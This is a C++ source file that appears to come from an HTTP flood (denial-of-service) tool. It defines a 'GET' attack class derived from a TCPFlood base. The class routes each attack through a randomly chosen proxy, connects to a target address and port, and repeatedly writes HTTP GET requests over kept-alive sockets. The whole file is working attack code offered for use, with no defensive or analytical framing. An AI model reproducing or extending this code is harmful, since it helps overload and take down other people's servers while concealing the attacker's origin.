#include "../../include/methods/GET.h"


GET::GET(string address, uint16_t port)
	:TCPFlood(address, port)
	, requestRawPathQS("/") // TODO: find out parsing similar to Python's YARL
	, requestBody("")
{	
	this->setHeader(this->getDefaultHeader());
	
	this->createRequest(this->type, requestRawPathQS, requestBody);
	
	this->getTarget()->updateProxy(ProxyManager::getInstance()->getRandomProxy());
	
	this->initNetwork();

	this->getNetworkPtr()->Create();
    if(network::State::CREATED == this->getNetworkPtr()->getState())
	{
        this->setState(flood::State::READY);
        return;
    }

    this->setState(flood::State::ERROR);
}

void GET::start()
{
	//this->setState(flood::State::RUNNING);
	// it is better to keep connection alive to avoid overhead	
    // https://stackoverflow.com/questions/20599570/is-it-better-to-keep-a-socket-open-for-frequent-requests-or-to-close-the-socket
    
    if(network::State::CREATED != this->getNetworkPtr()->getState())
        this->getNetworkPtr()->Create();

    if(network::State::CREATED == this->getNetworkPtr()->getState())
        this->getNetworkPtr()->Resolve();
    else
        return;

    if(network::State::HOST_RESOLVED == this->getNetworkPtr()->getState())
        this->getNetworkPtr()->Connect();
    else
        return;

    this->getNetworkPtr()->Write(this->header);
    
    this->setState(flood::State::READY);

    //cout << this->getType() << " " << this->getState() << " " << this->getTarget()->getAddress() << endl;
}

void GET::stop()
{
	this->setState(flood::State::HALT);
    this->getNetworkPtr()->Disconnect();
    //cout << this->getType() << " " << this->getState() << " " << this->getTarget()->getAddress() << endl;
}

void GET::initNetwork()
{
	this->networkPtr = new SocketGLIBC(this->getTarget()->getAddress(), this->getTarget()->getPort());
}
